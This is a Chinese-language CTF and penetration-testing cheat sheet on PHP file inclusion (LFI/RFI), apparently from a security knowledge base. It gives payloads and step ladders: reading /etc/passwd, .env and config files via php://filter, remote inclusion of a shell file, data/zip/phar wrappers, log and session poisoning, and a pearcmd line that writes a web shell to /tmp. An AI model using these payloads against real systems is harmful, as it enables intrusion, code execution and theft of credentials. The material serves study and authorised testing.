---
title: "文件包含：LFI、RFI 与代码执行"
summary: "先判定 LFI/RFI，再用 php://filter 读源码、data/zip/phar 执行或触发反序列化；含 filter chain、pearcmd、日志/session/临时文件与后缀限制。"
module: Web
topic: "Web漏洞"
tags: ["文件系统"]
status: 已整理
sourceIds: []
challengeIds: []
relatedIds: ["web-path-tricks", "web-upload-bypass", "web-php-features", "web-php-unserialize", "web-rce-bypass"]
updated: "2026-10-29"
---

文件包含的入口是 `include`/`require`/`include_once`，参数可控时就能把“读文件”升级为“执行代码”。先判断本地包含（LFI）还是远程包含（RFI），再看 `allow_url_include`、`open_basedir` 与日志/临时文件是否可用。

> 只对本地题目或授权环境测试；读取系统文件时注意不要破坏目标环境。

## 00 30 秒速查

| 我要… | 先试… | 备注 |
|---|---|---|
| 判定包含 | `?file=../../etc/passwd` | 看回显/报错 |
| 读源码 | `php://filter/convert.base64-encode/resource=index.php` | 避免执行 |
| 远程包含 | `http://你的地址/shell.txt` | 需 `allow_url_include=On` |
| 内联执行 | `data://text/plain;base64,...` | 同上 |
| 压缩包 | `zip:///tmp/a.zip%23shell.php` | 需 zip 扩展 |
| 反序列化 | `phar:///tmp/a.phar/x` | 元数据触发 |
| 日志 | UA 写码 + 包含 access.log | 路径要对 |
| session | upload_progress + `sess_<id>` | 竞争 |
| 无写权限 | `pearcmd.php` | argv 参数 |
| filter chain | 工具生成链 | 版本相关 |

## 01 原理与成立条件

```text
参数 → include/require → 解析路径
                           ├─ 本地文件 → 读/执行 PHP
                           ├─ 流包装器 → filter/data/phar
                           └─ 远程 URL → RFI（需配置）
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 参数进入 include | 原样拼接 | 白名单键→不是包含 |
| 路径可控 | 相对/绝对/协议 | 换参数/换入口 |
| 文件可读/可执行 | 权限/路径 | 换文件 |
| 配置允许 | 远程/协议 | 用本地/日志 |

| 类型 | 条件 | 表现 |
|---|---|---|
| LFI | 参数进 include | 读本地文件 |
| RFI | `allow_url_include=On` | 包含远程 URL |
| 伪协议 | 协议可用 | `data`/`php://input` |
| 日志包含 | 能写日志 | 日志代码执行 |

## 02 判断与分型

```text
?file= 能读本地文件吗？
 ├─ 能 → LFI
 │    ├─ 读源码 → php://filter
 │    ├─ 能写日志/session → 包含执行
 │    └─ 有 phar/zip → 反序列化/包内文件
 └─ 不能
      ├─ 远程 URL → RFI
      ├─ 报协议错 → 配置关闭
      └─ 统一 404 → 过滤/路径
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| 返回 base64 | filter 可用 | 解码源码 |
| 返回空白 | 脚本执行无输出 | 用 `phpinfo`/含输出 |
| 远程 URL 被拒 | `allow_url_include=Off` | 本地/日志 |
| `open_basedir` 报错 | 目录限制 | 读允许目录 |
| `phar://` 报错 | 扩展/路径 | 换协议 |
| 包含日志有代码 | 日志可写 | 执行 |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| 读到 `/etc/passwd` | 只是读取 | 找执行/源码 |
| 包含无输出 | 脚本只赋值 | base64 读源码 |
| 远程包含失败 | 配置 | 换本地 |
| 日志内容被转义 | 日志格式 | 换字段 |

## 03 利用阶梯

### L0 判定 LFI / RFI

**前提**：有 `include` 类参数。

**步骤**：
1. 试 `../../../../etc/passwd`。
2. 试 `php://filter/convert.base64-encode/resource=index.php`。
3. 试 `http://<你的地址>/shell.txt`。
4. 看报错确认 `allow_url_include`/`open_basedir`。

**成功标志**：稳定读到文件/远程内容被包含。

**失败分支**：统一 404→编码/路径；远程被拒→L1/L3。

### L1 读源码

**前提**：LFI 可用。

**步骤**：
1. `php://filter/read=convert.base64-encode/resource=config.php`。
2. 猜测路径：`/var/www/html/`、`/app/`、当前目录。
3. 读 `.env`/`config.php`/`index.php`。
4. 解码后找密钥、数据库、内网地址。

**成功标志**：拿到源码/配置。

**失败分支**：路径未知→报错/目录扫描；filter 被禁→换编码/日志。

### L2 执行：data / zip / phar

**前提**：能包含远程/协议或有上传能力。

**步骤**：
1. `data://text/plain,<?php ...?>`（需 `allow_url_include`）。
2. `php://input` + POST body。
3. 上传 zip：`zip:///tmp/a.zip%23shell.php`。
4. 上传 phar：`phar:///tmp/a.phar/x` 触发反序列化。

**成功标志**：代码执行/反序列化副作用。

**失败分支**：协议被禁→日志/session；phar 被拦→编码/换入口。

### L3 日志 / session / proc

**前提**：不能直接传可执行文件，但能写内容到可包含文件。

**步骤**：
1. 确认日志路径与可读性。
2. UA/Referer 写 `<?php ...?>`，包含 access.log。
3. session：`PHP_SESSION_UPLOAD_PROGRESS` 写文件名，包含 `sess_<id>`，cleanup 前竞争。
4. `/proc/self/environ`/`fd` 尝试。

**成功标志**：包含后执行/读到数据。

**失败分支**：日志不可读→换 error.log/fd；session 路径未知→读配置。

### L4 filter chain / pearcmd / 限制

**前提**：只能读、不能写，或后缀/关键字受限。

**步骤**：
1. `php_filter_chain_generator.py --chain '<?php ...?>'` 生成链。
2. 包含 `pearcmd.php`：`?+config-create+/<?=...?>+/tmp/shell.php`。
3. 后缀拼接：`%00`（PHP<5.3.4）、`/` 结尾、`?` 截断。
4. `open_basedir`：读允许目录/`glob://`。

**成功标志**：在限制下写文件/执行。

**失败分支**：版本不支持 chain→换日志；pear 不存在→换路径。

## 04 绕过与边界

| 限制 | 替代 | 示例 |
|---|---|---|
| 后缀 `.php` | `%00`/`/`/`?` | 版本相关 |
| `allow_url_include=Off` | `php://filter`/日志 | 本地 |
| `open_basedir` | 允许目录/`glob://` | 读配置 |
| 关键字过滤 | 大小写/双写/编码 | `PHP://` |
| `phar://` 被拦 | 大小写/编码 | `phar%3a//` |
| 无写权限 | pearcmd/filter chain | argv |
| 日志不可读 | `/proc/self/fd` | 描述符 |

边界：`php://filter` 默认可用；`data://` 需 `allow_url_include`；filter chain 依 PHP 版本/iconv；包含日志要确认路径与权限。

## 05 非典型入口

| 位置 | 示例 | 注意 |
|---|---|---|
| 模板 | `template=../../` | 包含 |
| 语言包 | `lang=../../` | 文件读取 |
| 缓存 | `cache=...` | 包含 |
| 图片 | `img=...` | 包含/读取 |
| 日志 | access/error | 投毒 |
| session | upload_progress | 竞争 |
| 临时文件 | `/tmp/phpXXXX` | 竞争 |
| pearcmd | `pearcmd.php` | argv |

## 06 差异速查

| 协议/配置 | 条件 | 用途 |
|---|---|---|
| `file://` | 默认 | 本地文件 |
| `php://filter` | 默认 | 编码读取 |
| `php://input` | `allow_url_include` | POST body |
| `data://` | `allow_url_include` | 内联执行 |
| `zip://` | zip 扩展 | 包内文件 |
| `phar://` | phar 扩展 | 反序列化 |
| `expect://` | expect 扩展 | 命令 |

## 07 工具与验证

| 目标 | 工具/命令 |
|---|---|
| 读源码 | `php://filter` |
| filter chain | `php_filter_chain_generator.py` |
| 日志 | `curl -A '<?php ...?>'` |
| session | 上传脚本 + 包含 |
| 压缩包 | `zip`/`phar` 本地生成 |
| 记录 | 请求/路径/内容 |

验证顺序：LFI → 源码 → 执行 → 限制 → 复现。

## 08 实战流程

| 阶段 | 动作 | 产出 |
|---|---|---|
| 1 入口 | include 参数 | 可控点 |
| 2 判定 | LFI/RFI/协议 | 类型 |
| 3 读取 | 源码/配置 | 密钥 |
| 4 执行 | data/日志/session | getshell |
| 5 绕过 | 后缀/open_basedir | 可用链 |
| 6 记录 | 请求/路径 | 报告 |

## 09 失败分支

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| 统一 404 | 过滤/路径 | 编码/深度 |
| 包含无输出 | 脚本无回显 | base64/filter |
| 远程失败 | `allow_url_include` | 本地/日志 |
| `open_basedir` | 目录限制 | 允许目录 |
| phar 无效 | 版本/路径 | 显式反序列化 |
| 日志不执行 | 路径/权限 | 换日志/fd |
| session 读不到 | cleanup/路径 | 竞争/配置 |

## 10 记录与复现

- [ ] 入口与包含语句
- [ ] LFI/RFI/协议
- [ ] 读到的源码/配置
- [ ] 执行链
- [ ] 限制与绕过
- [ ] 复现请求

| 记录项 | 内容 |
|---|---|
| 入口 | 参数名/语句 |
| 类型 | LFI/RFI/伪协议 |
| 读取 | 源码/日志/session |
| 执行 | data/日志/filter |
| 限制 | 后缀/目录/函数 |

相关： [路径与文件读取](/knowledge/web-path-tricks/)、[文件上传绕过](/knowledge/web-upload-bypass/)、[PHP 特性](/knowledge/web-php-features/)、[PHP 反序列化](/knowledge/web-php-unserialize/)、[RCE 绕过](/knowledge/web-rce-bypass/)。
